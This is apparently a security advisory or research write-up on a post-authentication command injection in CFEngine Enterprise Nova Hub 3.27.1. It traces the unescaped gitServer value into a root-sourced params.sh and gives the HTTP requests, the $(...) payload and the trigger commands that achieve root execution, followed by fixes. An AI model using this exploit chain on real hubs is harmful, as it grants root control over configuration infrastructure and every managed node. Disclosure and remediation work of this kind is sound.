# CFEngine Enterprise Nova Hub — VCS Settings Command Injection → Root RCE

## 1. Research Target & Attack Surface

CFEngine Enterprise Nova Hub 3.27.1 (Northern.tech AS) is the central management hub of a configuration-management platform — CII-critical infrastructure that distributes policy to every managed node. Compromising the hub means controlling policy distribution itself, which is the highest-impact target in the deployment. The hub runs two web stacks on the master node:

| Stack | Framework | Auth |
|---|---|---|
| `/api/` REST API | Tonic micro-framework | `SetupGuard` + `RbacGuard` middleware; `CfProtectedResource` (mandatory OAuth2/basic) or `CfBaseResource` (no auto-auth) |
| `/index.php/` app | CodeIgniter 3 | Controller-constructor `ion_auth->logged_in()` |

We focused on the `/api/` surface because Tonic resource classes occasionally forget to extend the authenticated base — a common source of auth bypass.

The sink is reachable only through `VcsSettings`, which extends `CfProtectedResource` — authentication (OAuth2 password grant with a per-install CSPRNG client secret, 2FA, and RBAC `vcs.post`) is mandatory, and exhaustive unauthenticated-surface analysis found no path to it. The finding is therefore an admin-triggered, post-authentication vulnerability.

## 2. Sink Identification: source of an Attacker-Influenced Shell Script

The interesting thing about this codebase is *how* configuration becomes executable. `VcsApi::generateUpdateScripts` writes `params.sh`, and `masterfiles-stage.sh:142` executes it by sourcing:

```bash
PARAMS=/opt/cfengine/dc-scripts/params.sh
...
source "$PARAMS"      # line 142 — command substitution executes
```

`masterfiles-stage.sh` runs in a cf-agent `commands` promise, and cf-agent runs as **root** on the hub (cf-serverd/cf-hub/cf-reactor all uid=0). So: **any attacker-influenced value that lands in `params.sh` unescaped becomes a root command**.

## 3. Source Identification: gitServer in POST /api/vcs/settings

`POST /api/vcs/settings` accepts a JSON body with `gitServer` and friends. The path to the sink:

```php
// Vcs.php:102-119
public function post($request) {
    $data = (array)Utils::getValidJsonData($request->data);   // json_decode only
    $validation = $this->_validateParameters($data);
    if ($validation === true) {
        $this->vcsApi->generateUpdateScripts($data);          // ← sink
    }
}
```

`_validateParameters` (`Vcs.php:25-62`) checks only: `gitServer` non-empty, `vcsType ∈ {GIT, GIT_CFBS}`, `gitRefspec` non-empty, `projectSubdirectory` not starting with `/`. **No regex, no `FILTER_VALIDATE_URL`, no `parse_url`, no shell-meta rejection** on `gitServer` — `$(...)` passes straight through.

The template replacement then mangles quoting:

```php
// VcsApi.php:143-145
foreach ($replace as $key => $val) {
    $replace[$key] = '"' . str_replace('"', '\"', $val) . '"';
    // $ ( ) ` { } \ NOT escaped
}
```

The template is `GIT_URL=%REMOTE_GIT_URL%`, so the generated `params.sh` contains `GIT_URL="$(...)"` — double-quoted, command substitution live.

## 4. End-to-End Data Flow

```
HTTP POST /api/vcs/settings
  body.gitServer = "$({ id ; } > /tmp/marker 2>&1; echo https://x.invalid/r.git)"
    → json_decode (no filtering)
    → _validateParameters (gitServer passes — no shell-meta rejection)
    → generateUpdateScripts → generateScriptFromTemplates
    → str_replace → params.sh: GIT_URL="$({ id ; } > /tmp/marker 2>&1; echo https://x.invalid/r.git)"
    → (cf-agent commands promise, as root)
    → masterfiles-stage.sh:142 source "$PARAMS"
    → command substitution executes → root RCE
```

## 5. Exploit Construction

**Step 1 — OAuth2 login (admin):**

```http
POST /api/oauth2/token HTTP/1.1
Content-Type: application/json

{"grant_type":"password","client_id":"MP","client_secret":"<secret>","username":"admin","password":"<password>"}
```

**Step 2 — inject gitServer:**

```http
POST /api/vcs/settings HTTP/1.1
Authorization: Bearer <access_token>
Content-Type: application/json

{"vcsType":"GIT","gitServer":"$({ id ; } > /tmp/cfe_root_proof 2>&1; echo https://x.invalid/r.git)","gitUsername":"u","gitPassword":"p","gitRefspec":"master","projectSubdirectory":"","buildProject":""}
```

The payload uses `{ <cmd> ; }` (brace group) so the redirection captures the whole command's output, and the trailing `echo https://x.invalid/r.git` keeps `GIT_URL` non-empty so the clone step fails harmlessly after the command already ran.

**Step 3 — verify params.sh:**

```bash
$ grep GIT_URL /opt/cfengine/dc-scripts/params.sh
GIT_URL="$({ id ; } > /tmp/cfe_root_proof 2>&1; echo https://x.invalid/r.git)"
```

**Step 4 — trigger masterfiles-stage.sh as root** (admin "deploy" action or manual `cf-agent -Dcfengine_internal_masterfiles_update`):

```bash
$ bash /var/cfengine/httpd/htdocs/api/dc-scripts/masterfiles-stage.sh -c
```

## 6. Dynamic Verification

Verified on CFEngine Enterprise Nova Hub 3.27.1 (container) with admin OAuth2 credentials:

1. OAuth2 login → Bearer token.
2. `gitServer` injection → HTTP 200 echoing the injected value.
3. `params.sh` confirmed to contain the unescaped `$(...)`.
4. `masterfiles-stage.sh` sourced it as root → fresh timestamped marker owned by `root`, content `uid=0(root)`.
5. A second run captured `whoami`, `hostname`, and `/etc/passwd` head — all as root.

The PoC script automates login, injection, and trigger (pure Python standard library).

## 7. Reachability & Impact

- **Auth**: admin (OAuth2 password grant + RBAC `vcs.post`); no unauthenticated path
- **Trigger**: the same admin who set the malicious `gitServer` triggers the deploy — a single privileged action chain, no second user required
- **Privilege**: root (uid 0) via cf-agent `commands` promise

The impact is post-auth admin → root RCE on the configuration-management hub — full control of policy distribution and every managed node, the maximum-impact compromise of the orchestration plane.

## 8. Fix Recommendations

1. `escapeshellarg` / `escapeshellcmd` on `gitServer` and every template parameter
2. Escape `$`, backticks, `(`/`)`, `{`/`}`, `\` in the replacement map
3. Write params as config data (or validate `gitServer` with a strict URL regex) instead of sourcing user-influenced shell variables
4. Enforce least privilege on cf-agent execution where feasible
